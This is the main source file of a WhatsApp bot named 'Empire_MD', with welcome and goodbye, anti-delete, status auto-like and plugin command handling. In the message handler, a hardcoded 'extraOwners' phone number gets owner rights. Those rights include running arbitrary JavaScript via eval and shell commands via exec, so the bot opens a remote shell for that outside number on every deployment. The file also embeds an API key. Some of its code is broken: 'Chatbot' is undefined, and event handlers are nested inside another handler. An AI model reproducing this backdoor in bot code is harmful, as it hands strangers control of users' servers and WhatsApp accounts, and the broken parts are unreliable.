const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  getContentType,
  fetchLatestBaileysVersion,
  Browsers
} = require('baileys');

const events = require('./empire/command');
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, saveConfig, Catbox, findMusic, monospace, ebinary, dbinary } = require('./empire/funcs');
const fs = require('fs');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const util = require('util');
const { sms, downloadMediaMessage } = require('./empire/func/msg');
const axios = require('axios');
const { File } = require('megajs');
const { exec } = require("child_process");
const mode = config.MODE;
const prefix = config.PREFIX;
const { sudoDB } = require("./database/sudo.js");
const ownerNumber = [config.OWNER_NUMBER];
require("events").EventEmitter.defaultMaxListeners = 1000;
const ffmpeg = require('fluent-ffmpeg')
const Goodbye = require('./database/goodbye');
const Welcome  = require('./database/welcome');
const AntiDelete  = require('./database/antidelete');
const AntiBot = require('./database/antibot');

// Add mode validation at the start
const validModes = ["public", "private", "inbox", "groups"];
if (!validModes.includes(config.MODE.toLowerCase())) {
  console.error("❌ Invalid MODE in config.js - using default 'public'");
  config.MODE = "public";
}

if (!fs.existsSync(__dirname + '/session/creds.json')) {
  if(!config.SESSION_ID) return console.log('Add your session id to SESSION_ID in config.js !!');
  const sessdata = config.SESSION_ID;
  const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
  filer.download((err, data) => {
      if(err) throw err;
      fs.writeFile(__dirname + '/session/creds.json', data, () => {
          console.log("");
      });
  });
}

const express = require("express");
const app = express();
const port = process.env.PORT || 8000;

async function connectToWA() {
const connectDB = require('./database/mongodb');
await connectDB();
  console.log("ℹ️ Connecting Please Wait...");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/session/');
  var { version } = await fetchLatestBaileysVersion();

  const conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      markOnlineOnConnect: false,
      defaultQueryTimeoutMs: 60000,
      fireInitQueries: true,
      msgRetryCounterCache: new Map(),
      auth: state,
      version
  });

  // Function to check mode restrictions
  const checkModeRestrictions = (isGroup, isOwner) => {
    if (isOwner) return false; // Owners bypass all restrictions
    
    if (config.MODE === "private") {
      return "❌ Bot is in private mode - only owner can use";
    }
    if (config.MODE === "inbox" && isGroup) {
      return "❌ Bot is in inbox mode - groups not allowed";
    }
    if (config.MODE === "groups" && !isGroup) {
      return "❌ Bot is in group mode - PM not allowed";
    }
    return false;
  };

conn.ev.on('connection.update', (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
connectToWA()
}
} else if (connection === 'open') {
console.log('✅ Login Successful!')
const path = require('path');
fs.readdirSync("./empire/cmds/").forEach((plugin) => {
    if (path.extname(plugin).toLowerCase() == ".js") {
        require("./empire/cmds/" + plugin);
    }
});
console.log('⬇️  Installing External Plugins...')
console.log('✅  External Plugins Installed!')

const totalCommands = Array.isArray(events.commands) ? events.commands.length : 0;

let up = `
  ᴇᴍᴘɪʀᴇ_ᴍᴅ ᴄᴏɴɴᴇᴄᴛᴇᴅ

  ᴘʀᴇғɪx  : [ ${prefix} ]
  ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands}
  ᴍᴏᴅᴇ    : ${monospace(mode)}
  ᴅᴀᴛᴀʙᴀsᴇ : ᴍᴏɴɢᴏᴅʙ

 sᴜʙsᴄʀɪʙᴇ ᴛᴏ ʏᴏᴜᴛᴜʙᴇ
youtube.com/@only_one_empire`;

console.log(up);

conn.sendMessage(`${ownerNumber}@s.whatsapp.net`, { text: up });
}
})
conn.ev.on('creds.update', saveCreds)  

conn.ev.on('messages.upsert', async (mek) => {
    try {
        if (!mek || !mek.messages || !mek.messages[0]) return;
        let msg = mek.messages[0]; 
        if (!msg.key || !msg.key.remoteJid) return; // Ensure remoteJid exists

        let m = sms(conn, mek);
        let from = msg.key.remoteJid;
        let sender = msg.key.fromMe 
            ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) 
            : (msg.key.participant || msg.key.remoteJid);
        let senderNumber = sender.split('@')[0];
        let isGroup = from.endsWith('@g.us');
        let botNumber = conn.user.id.split(':')[0];
        let isMe = botNumber.includes(senderNumber);
        let body = m.text || '';
        let isCmd = body.startsWith(prefix);
        let q = body.trim();

        if (!isGroup || isMe || isCmd || !q) return;
        let chatbotData = await Chatbot.findOne({ groupId: from });
        if (!chatbotData || !chatbotData.enabled) return; 

        let data = await fetchJson(`https://apis.giftedtech.web.id/api/ai/gpt4?apikey=_0x5aff35,_0x1876stqr&q=${encodeURIComponent(q)}`);

        if (data?.response) {
            await conn.sendMessage(from, { text: data.response, mentions: [sender] });
        }

    } catch (e) {
        console.error('❌ Chatbot Error:', e);
    }
});

conn.ev.on('messages.upsert', async (chatUpdate) => {
  try {
    const mek = chatUpdate.messages[0];
    if (!mek.message || !mek.key.remoteJid.endsWith('@g.us')) return;

    const groupId = mek.key.remoteJid;
    const senderJid = mek.key.participant || mek.key.remoteJid;
    const senderWid = senderJid.split('@')[0];

    // Fetch AntiBot status
    const groupData = await AntiBot.findOne({ groupId });
    if (!groupData || !groupData.enabled) return;

    // Allow only normal user JID types
    if (senderJid.endsWith('@s.whatsapp.net') || 
        senderJid.endsWith('@g.us') || 
        senderJid.endsWith('@whatsapp.net')) return;

    if (senderWid.startsWith('BAE5')) {
      await conn.sendMessage(groupId, { text: `❌ Bots  are not allowed in this group!` }, { quoted: mek });
      await conn.sendMessage(groupId, { delete: mek.key });

      console.log(`🚨 Deleted bot message from: ${senderWid}`);
    }

  } catch (err) {
    console.error('❌ Error in AntiBot detection:', err);
  }
});

conn.ev.on('group-participants.update', async (update) => {
  const { id, participants, action } = update;

  if (action === 'remove') {
    let groupMetadata = null;
    let groupName = '';
    let groupDescription = '';
    let participantCount = 0;

    try {
      groupMetadata = await conn.groupMetadata(id);
      groupName = groupMetadata?.subject || 'Unknown Group';
      groupDescription = groupMetadata?.desc || 'No description available.';
      participantCount = groupMetadata?.participants?.length || 0;
    } catch (e) {
      console.error('❌ Error fetching group metadata:', e);
      return;
    }

    const groupData = await Goodbye.findOne({ groupId: id });
    if (!groupData || !groupData.enabled) return;

    for (let participant of participants) {  
      const userJid = participant;  
      const userNumber = userJid.split('@')[0];  

      // Get User Profile Picture  
      let ppUrl = 'https://files.catbox.moe/6ntq2i.jpg';  

      try {  
        ppUrl = await conn.profilePictureUrl(userJid, 'image');  
      } catch {}  

      // Format Goodbye Message
      const goodbyeMessage = groupData.message
        .replace('@user', `@${userNumber}`)
        .replace('@pp', ppUrl)
        .replace('@group', groupName)
        .replace('@count', participantCount);

      await conn.sendMessage(id, { 
        image: { url: ppUrl },
        caption: `😢 *Goodbye from ${groupName}!* 😢\n\n${goodbyeMessage}\n👥 *Total Members:* ${participantCount}\n\n📌 *Group Description:*\n${groupDescription}`,
        mentions: [userJid] 
      });
    }
  }
});

 conn.ev.on('group-participants.update', async (update) => {  
  const { id, participants, action } = update;  

  if (action === 'add') {  
    let groupMetadata = null;  
    let groupName = '';  
    let groupDescription = '';  
    let participantCount = 0;  

    try {  
      groupMetadata = await conn.groupMetadata(id);  
      groupName = groupMetadata?.subject || 'Unknown Group';  
      groupDescription = groupMetadata?.desc || 'No description available.';  
      participantCount = groupMetadata?.participants?.length || 0;  
    } catch (e) {  
      console.error('❌ Error fetching group metadata:', e);  
      return;  
    }  

    const groupData = await Welcome.findOne({ groupId: id });  
    if (!groupData || !groupData.enabled) return;  

    for (let participant of participants) {  
      const userJid = participant;  
      const userNumber = userJid.split('@')[0];  

      // Get User Profile Picture  
      let ppUrl = 'https://files.catbox.moe/6ntq2i.jpg';  

      try {  
        ppUrl = await conn.profilePictureUrl(userJid, 'image');  
      } catch {}  

       // Format Goodbye Message
      const goodbyeMessage = groupData.message
        .replace('@user', `@${userNumber}`)
        .replace('@pp', ppUrl)
        .replace('@group', groupName)
        .replace('@count', participantCount);

      // Properly send the image and welcome message  
      await conn.sendMessage(id, {  
        image: { url: ppUrl },  
        caption: `🎉 *Welcome to ${groupName}!* 🎉\n\n👤 @${userNumber} just joined the group!\n\n👥 *Total Members:* ${participantCount}\n📌 *Group Description:* ${groupDescription}`  
      }, { mentions: [userJid] });  
    }  
  }  
});

conn.ev.on('messages.update', async (updates) => {
    for (const msg of updates) {
        try {
            if (!msg.key || !msg.key.remoteJid || !msg.key.id || msg.updateStubType !== 68) continue;

            const jid = msg.key.remoteJid;
            const isGroup = jid.endsWith('@g.us');
            const sender = msg.key.participant || jid;

            // Check if Anti-Delete is enabled
            const antiDeleteData = await AntiDelete.findOne({ jid });
            if (!antiDeleteData || !antiDeleteData.enabled) return;

            // Fetch the deleted message
            const deletedMsg = await conn.loadMessage(jid, msg.key.id);
            if (!deletedMsg) return;

            // Convert message into readable format
            const m = sms(conn, deletedMsg);

            let text = `🛑 *Anti-Delete Detected!*\n\n`;
            text += `👤 *User:* @${sender.split('@')[0]}\n`;
            text += `📌 *Message:* ${m.body || '_No text_'}`;

            // Handle different media types
            if (m.message?.imageMessage) {
                let buffer = await m.download();
                conn.sendMessage(jid, { image: buffer, caption: text, mentions: [sender] }, { quoted: m });
            } else if (m.message?.videoMessage) {
                let buffer = await m.download();
                conn.sendMessage(jid, { video: buffer, caption: text, mentions: [sender] }, { quoted: m });
            } else if (m.message?.stickerMessage) {
                let buffer = await m.download();
                conn.sendMessage(jid, { sticker: buffer, mentions: [sender] }, { quoted: m });
            } else if (m.message?.audioMessage) {
                let buffer = await m.download();
                conn.sendMessage(jid, { audio: buffer, ptt: false, mentions: [sender] }, { quoted: m });
            } else if (m.message?.documentMessage) {
                let buffer = await m.download();
                conn.sendMessage(jid, { document: buffer, mimetype: m.message.documentMessage.mimetype, fileName: m.message.documentMessage.fileName, mentions: [sender] }, { quoted: m });
            } else {
                conn.sendMessage(jid, { text, mentions: [sender] }, { quoted: m });
            }
        } catch (err) {
            console.error('Error in Anti-Delete:', err);
        }
    }
});

conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (mek.key && mek.key.remoteJid === "status@broadcast") {
    try {

        if (config.AUTO_VIEW_STATUS === "true" && mek.key) {
            await conn.readMessages([mek.key]);
        }

        // Auto like status
        if (config.AUTO_LIKE_STATUS === "true") {
            const customEmoji = config.AUTO_LIKE_EMOJI || '💜';
            if (mek.key.remoteJid && mek.key.participant) {
                await conn.sendMessage(
                    mek.key.remoteJid,
                    { react: { key: mek.key, text: customEmoji } },
                    { statusJidList: [mek.key.participant] }
                );
            }
        }
    } catch (error) {
        console.error("Error processing status actions:", error);
    }
}

conn.ev.on('call', async (call) => {
    const callData = call[0]; // Get the first call object
    if (callData.status === 'offer' && config.ANTICALL === "true") {
        await conn.sendMessage(callData.from, {
            text: config.ANTICALL_MSG,
            mentions: [callData.from],
        });
        await conn.rejectCall(callData.id, callData.from);
    }
});

conn.ev.on('messages.upsert', async (mek) => {
    try {
        mek = mek.messages[0];
        if (!mek.message) return;

        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const from = mek.key.remoteJid;
        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
        const body = (type === 'conversation') ? mek.message.conversation : 
                    (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : 
                    (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : 
                    (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');
        const isGroup = from.endsWith('@g.us');
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0];
        const pushname = mek.pushName || '𝖤𝗆𝗉𝗂𝗋𝖾 �𝖳𝖾𝖼𝗁';
        const isMe = botNumber.includes(senderNumber);
        const extraOwners = ["2348144250768"];
        const sudoNumbers = [];

        async function loadSudoUsers() {
            try {
                const sudoUsers = await sudoDB.find();
                sudoNumbers.push(...sudoUsers.map(user => user.id));
            } catch (e) {
                console.log("Error loading sudo users:", e);
            }
        }

        await loadSudoUsers();

        const isOwner = (senderNumber) => 
            ownerNumber.includes(senderNumber) || 
            extraOwners.includes(senderNumber) || 
            sudoNumbers.includes(senderNumber) || 
            isMe;
        
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        let groupMetadata = null;
        let groupName = '';
        let participants = [];

        if (isGroup) {
            try {
                groupMetadata = await conn.groupMetadata(from);
                groupName = groupMetadata?.subject || '';
                participants = groupMetadata?.participants || [];
            } catch (e) {
                console.error('❌ Error fetching group metadata:', e);
            }
        }
        
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
        
        const reply = (teks) => {
            conn.sendMessage(from, { text: teks }, { quoted: mek });
        };

        // Mode check for commands
        const modeRestriction = checkModeRestrictions(isGroup, isOwner(senderNumber));
        if (modeRestriction && isCmd) {
            return reply(modeRestriction);
        }

        if (body.startsWith(">") && isOwner(senderNumber)) {
            try {
                if (!q) return reply("❌ Provide a valid expression to evaluate!");

                let result = await eval(q);
                if (typeof result !== "string") result = require("util").inspect(result);

                reply(`✅ Result:\n${result}`);
            } catch (e) {
                reply(`❌ Error:\n${e.message}`);
            }
        }

        if (body.startsWith("$") && isOwner(senderNumber)) {
            try {
                if (!q) return reply("❌ Provide a valid command to run in terminal");

                exec(q, (err, stdout, stderr) => {
                    if (err) return reply(`❌ Error:\n${err.message}`);
                    if (stderr) return reply(`⚠️ Stderr:\n${stderr}`);
                    reply(`✅ Output:\n${stdout}`);
                });
            } catch (e) {
                reply(`❌ Error:\n${e.message}`);
            }
        }

        conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
            let mime = '';
            let res = await axios.head(url);
            mime = res.headers['content-type'];
            if (mime.split("/")[1] === "gif") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
            }
            let type = mime.split("/")[0] + "Message";
            if (mime === "application/pdf") {
                return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options });
            }
            if (mime.split("/")[0] === "image") {
                return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
            }
            if (mime.split("/")[0] === "video") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
            }
            if (mime.split("/")[0] === "audio") {
                return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
            }
        };

        const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
        if (isCmd) {
            const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
            if (cmd) {
                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});

                try {
                    cmd.function(conn, mek, m, {from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                } catch (e) {
                    console.error("[PLUGIN ERROR] " + e);
                }
            }
        }

        events.commands.map(async(command) => {
            if (body && command.on === "body") {
                command.function(conn, mek, m, {from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
            } else if (mek.q && command.on === "text") {
                command.function(conn, mek, m, {from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
            } else if (
                (command.on === "image" || command.on === "photo") &&
                mek.type === "imageMessage"
            ) {
                command.function(conn, mek, m, {from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
            } else if (
                command.on === "sticker" &&
                mek.type === "stickerMessage"
            ) {
                command.function(conn, mek, m, {from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
            }
        });
    } catch (e) {
        console.error('Error in message processing:', e);
    }
});
}

app.get("/", (req, res) => {
    res.sendFile(__dirname + "/assets/empire.html");
});

app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

setTimeout(() => {
    connectToWA();
}, 4000);
